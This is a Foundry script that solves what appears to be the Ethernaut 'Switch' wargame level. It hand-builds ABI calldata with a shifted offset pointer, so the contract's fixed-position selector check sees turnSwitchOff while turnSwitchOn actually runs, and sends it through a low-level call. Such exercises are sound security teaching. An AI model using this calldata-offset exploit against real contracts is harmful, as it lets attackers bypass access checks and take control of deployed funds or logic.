// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/levels/Switch/Switch.sol"; 
import "forge-std/Script.sol";

contract CounterScript is Script {
    function setUp() public {}

    function run() public {
        address target = address(0x0000000000000000000000000000000000000000); // Insert level target address
                                 
        // Compute selectors
        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));

        // Build raw calldata from bytes
        bytes memory calldata_ = bytes.concat(
            flipSelector,           //|4B flipSelector|
            bytes32(uint256(68)),   //|32B ptr to _data in calldata (0x00..44)|
            bytes32(uint256(0)),    //|32B 0x00..00|
            offSelector,            //|4B offSelector|
            bytes32(uint256(4)),    //|32B _data length (0x00..04)|
            onSelector              //|4B _data[0] 4 MSB (onSelector)|
        );

        vm.startBroadcast();

        // Attack through low level call
        (bool result,) = address(target).call(calldata_);
        require(result);
        vm.stopBroadcast();
    }
}
